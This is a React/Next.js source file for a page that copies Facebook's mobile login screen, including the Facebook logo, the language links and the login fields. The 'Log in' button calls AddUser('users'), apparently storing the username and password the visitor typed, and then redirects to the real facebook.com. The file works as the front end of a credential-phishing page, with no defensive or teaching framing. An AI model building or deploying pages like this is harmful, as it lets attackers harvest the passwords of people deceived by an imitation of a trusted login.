import AddLanguage from "@/components/addLanguage";
import CreateNewAccPart from "@/components/createNewAccPart";
import Footer from "@/components/footer";
import ForgotPass from "@/components/forgotPass";
import Header from "@/components/header";
import Input from "@/components/input";
import Language from "@/components/language";
import LoginButton from "@/components/loginButton";
import { UserContext } from "@/contexts/userContext";
import Image from "next/image";
import { useContext } from "react";

const Languages = [
  [
    { text: "English (US)", color: "text-[#90949c]" },
    { text: "中文(简体)", color: "text-[#576b95]" },
    { text: "Русский", color: "text-[#576b95]" },
    { text: "Español", color: "text-[#576b95]" },
  ],
  [
    { text: "Монгол", color: "text-[#576b95]" },
    { text: "Қазақша", color: "text-[#576b95]" },
    { text: "Türkçe", color: "text-[#576b95]" },
  ],
];

export default function Home() {
  const {
    username,
    setUsername,
    password,
    setPassword,

    AddUser,
  } = useContext(UserContext);

  return (
    <div className="h-screen">
      <Header />
      <div className="h-full flex flex-col items-center mt-[8px] px-[16px]">
        <Image
          src={"https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg"}
          width={112}
          height={39}
          className="cursor-pointer"
          alt=""
        />
        <div className="mt-[8px]"></div>
        <Input
          type={"text"}
          placeholder={"Mobile number or email"}
          onChange={(e) => setUsername(e.target.value)}
        />
        <div className="mt-[8px]"></div>
        <Input
          type={"password"}
          placeholder={"Password"}
          onChange={(e) => setPassword(e.target.value)}
        />
        <div className="mt-[12px]"></div>
        <LoginButton
          text={"Log in"}
          href={"https://www.facebook.com"}
          onClick={async () => {
            await AddUser("users");
          }}
        />
        <div className="mt-[10px]"></div>
        <ForgotPass text={"Forgot password?"} />
        <div className="mt-[12px]"></div>
        <CreateNewAccPart />
        <div className="mt-[100px]"></div>
        <div className="flex w-full p-[6px]">
          <div className="w-full">
            {Languages[0].map((language, index) => (
              <Language
                text={language.text}
                className={language.color}
                key={index}
              />
            ))}
          </div>
          <div className="w-full">
            {Languages[1].map((language, index) => (
              <Language
                text={language.text}
                className={language.color}
                key={index}
              />
            ))}
            <AddLanguage />
          </div>
        </div>
        <Footer />
      </div>
    </div>
  );
}
